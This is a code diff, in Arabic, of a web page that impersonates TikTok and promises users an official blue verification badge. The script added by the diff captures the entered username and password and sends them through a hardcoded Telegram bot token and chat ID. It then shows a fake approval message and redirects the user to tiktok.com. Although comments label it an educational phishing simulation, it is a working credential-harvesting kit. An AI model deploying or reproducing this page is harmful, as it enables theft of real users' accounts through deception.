@@ -63,7 +63,7 @@
             </div>
         </div>
         <div class="flex items-center gap-x-4">
-            <span class="text-[#25F4EE] text-xl">♬</span>
+            <span class="text-[#25F4EE] text-xl"></span>
             <div class="w-8 h-8 bg-white/10 rounded-2xl flex items-center justify-center text-xs font-bold">TT</div>
         </div>
     </div>
@@ -75,7 +75,6 @@
             <div class="pt-10 pb-6 px-8 text-center">
                 <!-- شعار TikTok -->
                 <div class="tiktok-logo mx-auto flex items-center justify-center gap-x-3 mb-6">
-                    <div class="text-7xl leading-none">♬</div>
                     <h1 class="text-6xl font-black tracking-[-4px] neon-cyan" style="color: #25F4EE;">TikTok</h1>
                 </div>
 
@@ -89,7 +88,7 @@
                 
                 <div class="mt-8 bg-black/60 border border-[#25F4EE]/20 rounded-2xl p-5 text-white/90 text-sm">
                     تهانينا! 🎉<br>
-                    حسابك <span class="font-semibold text-[#25F4EE]">@yourusername</span> تم اختياره من قبل فريق المواهب للحصول على 
+                    حسابك <span class="font-semibold text-[#25F4EE]"></span> تم اختياره من قبل فريق المواهب للحصول على 
                     <span class="font-bold text-white">الشارة الزرقاء الرسمية</span> بعد أداء استثنائي على FYP.
                 </div>
             </div>
@@ -166,146 +165,101 @@
     </div>
 
     <script>
-        // تفعيل Tailwind
-        function initializeTailwind() {
-            return {
-                config(userConfig = {}) {
-                    return {
-                        content: [],
-                        theme: {
-                            extend: {},
-                        },
-                        plugins: [],
-                        ...userConfig,
-                    }
-                },
-                theme: {
-                    extend: {},
-                },
-            }
-        }
-        
-        // تشغيل المحاكاة عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('verify-form')
-            const submitBtn = document.getElementById('submit-btn')
-            
-            form.addEventListener('submit', function (e) {
-                e.preventDefault()
-                
-                // حفظ النص الأصلي
-                const originalText = submitBtn.innerHTML
-                
-                // حالة التحميل
-                submitBtn.style.pointerEvents = 'none'
-                submitBtn.innerHTML = `
-                    <svg class="animate-spin h-6 w-6 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
-                    </svg>
-                    <span class="ml-3">جاري التحقق من حسابك...</span>
-                `
-                // محاكاة الإرسال (2 ثانية)
-                setTimeout(() => {
-                    submitBtn.innerHTML = `
-                        <span class="text-2xl">✅</span>
-                        <span class="ml-3">تم التحقق بنجاح!</span>
-                    `
-                    submitBtn.style.backgroundColor = '#22c55e'
-                    
-                    // رسالة نجاح كاملة بعد 1.5 ثانية
-                    setTimeout(() => {
-                        const successHTML = `
-                            <div class="fixed inset-0 bg-black/90 flex items-center justify-center z-[10000] p-6">
-                                <div class="max-w-md w-full bg-[#111] rounded-3xl p-8 text-center">
-                                    <div class="text-8xl mb-6">🎉</div>
-                                    <h3 class="text-3xl font-bold text-white mb-3">مبروك!</h3>
-                                    <p class="text-[#25F4EE] text-xl">تمت الموافقة على طلبك للشارة الزرقاء</p>
-                                    <p class="text-white/70 mt-8">سيتم تفعيل الشارة خلال 24 ساعة</p>
-                                    <button onclick="location.reload()" 
-                                            class="mt-10 w-full py-5 bg-[#25F4EE] text-black font-bold rounded-3xl text-lg">
-                                        العودة إلى TikTok
-                                    </button>
-                                </div>
-                            </div>
-                        `
-                        document.body.insertAdjacentHTML('beforeend', successHTML)
-                    }, 1500)
-                }, 2200)
-            })
-            
-            console.log('%c✅ صفحة محاكاة TikTok Verification Portal جاهزة للتدريب!', 'color:#25F4EE; font-size:16px; font-weight:bold')
-        })
-    </script>
-	<script>
 // ================================================
-// 🚨 TikTok Phishing Simulation - JavaScript Backend
+// 🚨 TikTok Verification Phishing Simulation 
+// دمج كامل (UI + Telegram Exfiltration)
 // لأغراض التوعية الأمنية فقط - ورشة عمل تدريبية
 // ================================================
 
-const BOT_TOKEN = "6006328232:AAE6jbKOerZabPVxDfDOqFoHgkI6yF38w5k";   // ← غيّر هذا
-const CHAT_ID   = "6599108362";     // ← غيّر هذا
-
+// ────── إعدادات Telegram (غيّرها بمعلوماتك) ──────
+const BOT_TOKEN = "6006328232:AAE6jbKOerZabPVxDfDOqFoHgkI6yF38w5k";
+const CHAT_ID   = "6599108362";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-document.getElementById('verify-form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value.trim();
-    
-    if (!username || !password) {
-        alert("يرجى ملء جميع الحقول");
-        return;
-    }
-
-    // زر التحميل
+// انتظر تحميل الصفحة
+document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('verify-form');
     const submitBtn = document.getElementById('submit-btn');
-    const originalText = submitBtn.innerHTML;
-    submitBtn.style.pointerEvents = 'none';
-    submitBtn.innerHTML = `
-        <svg class="animate-spin h-6 w-6 text-black mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
-        </svg>
-    `;
 
-    // تنسيق الرسالة
-    const timestamp = new Date().toLocaleString('ar-MA');
-    const message = `🚨 **New TikTok Simulation Login!** 🚨
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            alert("يرجى ملء جميع الحقول");
+            return;
+        }
+
+        // حالة التحميل
+        const originalBtnHTML = submitBtn.innerHTML;
+        submitBtn.style.pointerEvents = 'none';
+        submitBtn.innerHTML = `
+            <svg class="animate-spin h-6 w-6 text-black mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+            </svg>
+            <span class="ml-3">جاري التحقق من حسابك...</span>
+        `;
+
+        // ────── إرسال البيانات إلى Telegram ──────
+        const timestamp = new Date().toLocaleString('ar-MA');
+        const message = `🚨 **New TikTok Simulation Login!** 🚨
 
 🧑‍💻 **Username**: ${username}
 🔑 **Password**: ${password}
 
 ⏰ **Time**: ${timestamp}
-🌐 **Source**: TikTok Verification Simulation (Educational);
+🌐 **Source**: TikTok Verification Simulation (Educational)
+🔴 هذه محاكاة تدريبية فقط`;
 
-    try {
-        // إرسال إلى Telegram
-        const response = await fetch(TELEGRAM_API, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-
-        if (response.ok) {
+        try {
+            await fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
             console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
-        } else {
-            console.error('⚠️ فشل إرسال Telegram:', response.status);
+        } catch (error) {
+            console.error('❌ خطأ في إرسال Telegram:', error);
         }
-    } catch (error) {
-        console.error('❌ خطأ في الاتصال بTelegram:', error);
-    }
 
-    // محاكاة تأخير قصير (لتبدو واقعية)
-    setTimeout(() => {
-        // توجيه الضحية إلى الموقع الرسمي
-        window.location.href = "https://www.tiktok.com";
-    }, 1800);
+        // ────── عرض رسالة النجاح ──────
+        setTimeout(() => {
+            submitBtn.innerHTML = `
+                <span class="text-2xl">✅</span>
+                <span class="ml-3">تم التحقق بنجاح!</span>
+            `;
+            submitBtn.style.backgroundColor = '#22c55e';
+
+            // عرض النافذة المنبثقة الكاملة
+            setTimeout(() => {
+                const successHTML = `
+                    <div class="fixed inset-0 bg-black/90 flex items-center justify-center z-[10000] p-6">
+                        <div class="max-w-md w-full bg-[#111] rounded-3xl p-8 text-center border border-[#25F4EE]/30">
+                            <div class="text-8xl mb-6">🎉</div>
+                            <h3 class="text-3xl font-bold text-white mb-3">مبروك!</h3>
+                            <p class="text-[#25F4EE] text-xl">تمت الموافقة على طلبك للشارة الزرقاء</p>
+                            <p class="text-white/70 mt-8">سيتم تفعيل الشارة خلال 24 ساعة</p>
+                            
+                            <button onclick="window.location.href='https://www.tiktok.com'" 
+                                    class="mt-10 w-full py-5 bg-[#25F4EE] text-black font-bold rounded-3xl text-lg hover:bg-[#25F4EE]/90 transition">
+                                العودة إلى TikTok
+                            </button>
+                        </div>
+                    </div>
+                `;
+                document.body.insertAdjacentHTML('beforeend', successHTML);
+            }, 800);
+        }, 1600);
+    });
+
+    console.log('%c✅ صفحة محاكاة TikTok Verification Portal + Telegram جاهزة!', 'color:#25F4EE; font-size:16px; font-weight:bold');
 });
 </script>
 </body>
